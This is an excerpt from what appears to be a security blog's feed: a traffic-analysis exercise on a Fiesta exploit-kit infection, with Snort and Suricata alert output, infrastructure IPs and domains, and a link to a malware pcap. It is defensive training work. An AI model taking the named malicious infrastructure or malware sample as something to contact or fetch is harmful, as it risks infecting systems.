01/14/2015-10:27:30.674478  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018959:4] ET POLICY PE EXE or DLL Windows file download HTTP &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49288
01/14/2015-10:27:30.674478  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2016538:3] ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49288
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;analyse-the-traffic-with-snort&quot;&gt;Analyse the traffic with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;&lt;/h5&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 2.pcap &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console
01/14-15:27:21.493706  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:98] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49281 -&amp;gt; 5.196.214.27:80
01/14-15:27:21.493706  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2020895:5] ET CURRENT_EVENTS Magnitude Flash Exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; M2 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49281 -&amp;gt; 5.196.214.27:80
01/14-15:27:21.493706  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2019799:2] ET CURRENT_EVENTS Magnitude Flash Exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49281 -&amp;gt; 5.196.214.27:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="ek" /><category term="blueteam" /><summary type="html">Description Analyze the following packet and answer the questions.</summary></entry><entry><title type="html">Fiesta EK - Traffic Monitoring with Suricata</title><link href="https://jayngng.github.io/blog/fiesta-ek-traffic-monitoring-with-suricata/" rel="alternate" type="text/html" title="Fiesta EK - Traffic Monitoring with Suricata" /><published>2021-09-25T23:27:03+10:00</published><updated>2021-09-25T23:27:03+10:00</updated><id>https://jayngng.github.io/blog/fiesta-ek---traffic-monitoring-with-suricata</id><content type="html" xml:base="https://jayngng.github.io/blog/fiesta-ek-traffic-monitoring-with-suricata/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Analyze the following packet and answer the questions.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Link to download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;: &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/01/18/2015-01-18-traffic-analysis-exercise-1-of-2.pcap.zip&quot;&gt;here&lt;/a&gt;.
(Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Credit&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware-traffic-analysis.net&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;question&quot;&gt;&lt;strong&gt;Question&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;For each pcap, answer the following questions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;1) What is the date and time of the activity? &lt;br /&gt;
2) What is the IP address of the Windows host that gets infected?&lt;br /&gt;
3) What is the domain name and IP address of the compromised web site?&lt;br /&gt;
4) What is the domain name and IP address that delivered the exploit kit (EK)?&lt;br /&gt;
5) What is the name of the EK?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;answer--rationale&quot;&gt;&lt;strong&gt;Answer &amp;amp; Rationale&lt;/strong&gt;&lt;/h2&gt;
&lt;h5 id=&quot;1-what-is-the-date-and-time-of-the-activity&quot;&gt;&lt;strong&gt;[1]. What is the date and time of the activity?&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2015-01-08 23:51:21&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/1.png&quot; title=&quot;fiesta/1.png&quot; alt=&quot;fiesta/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;h5 id=&quot;2-what-is-the-ip-address-of-the-windows-host-that-gets-infected&quot;&gt;&lt;strong&gt;[2]. What is the IP address of the Windows host that gets infected?&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.138.158&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/2.png&quot; title=&quot;fiesta/2.png&quot; alt=&quot;fiesta/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;h5 id=&quot;3-what-is-the-domain-name-and-ip-address-of-the-compromised-web-site&quot;&gt;&lt;strong&gt;[3]. What is the domain name and IP address of the compromised web site?&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;Domain name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.subaruoutback.org&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;108.168.211.93&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/3.png&quot; title=&quot;fiesta/3.png&quot; alt=&quot;fiesta/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;h5 id=&quot;4-what-is-the-domain-name-and-ip-address-that-delivered-the-exploit-kit-ek&quot;&gt;&lt;strong&gt;[4]. What is the domain name and IP address that delivered the exploit kit (EK)?&lt;/strong&gt;&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;Domain name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atypefresh.in&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;IP address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;205.234.186.112&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;5-what-is-the-ek-name&quot;&gt;&lt;strong&gt;[5]. What is the EK name?&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fiesta&lt;/code&gt; EK.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;snort&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Within the Security Onion.&lt;/li&gt;
  &lt;li&gt;From the first terminal, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpreplay&lt;/code&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.pcap&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpreplay &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 1.pcap 
sending out eth0 
processing file: 1.pcap
Actual: 4804 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4899622 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.31 seconds.              Rated: 15805232.0 bps, 120.58 Mbps, 15496.77 pps
Statistics &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;network device: eth0
        Attempted packets:         4804
        Successful packets:        4804
        Failed packets:            0
        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ENOBUFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 0
        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EAGAIN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:  0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Within the second terminal, we execute the following command and observe that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; rule is triggered.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 
09/25-02:51:27.566318  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2019655:5] ET CURRENT_EVENTS Fiesta EK Landing Nov 05 2014 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 205.234.186.112:80 -&amp;gt; 192.168.138.158:51629
09/25-02:51:27.571936  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51677 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.574725  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018408:1] ET CURRENT_EVENTS Fiesta PDF Exploit Download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 205.234.186.112:80 -&amp;gt; 192.168.138.158:51677
09/25-02:51:27.644398  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51713 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.731970  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51723 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.754655  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51725 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.755333  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51735 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.797567  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51751 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2011582:46] ET POLICY Vulnerable Java Version 1.6.x Detected &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014912:6] ET CURRENT_EVENTS Unknown - Java Request  - gt 60char hex-ascii &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2019611:6] ET CURRENT_EVENTS Fiesta Java Exploit/Payload URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;suricata&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Offline input.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;suricata &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/suricata/suricata.yaml &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; ../../malware-analysis/20150118/1.pcap &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fast.log | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt;
01/08/2015-18:51:31.706476  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51682 -&amp;gt; 205.234.186.112:80
01/08/2015-18:51:30.207155  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51678 -&amp;gt; 205.234.186.112:80
01/08/2015-18:51:29.324080  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51666 -&amp;gt; 205.234.186.112:80
01/08/2015-18:51:29.324080  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:127] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51666 -&amp;gt; 205.234.186.112:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Reading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eve.json&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evebox&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

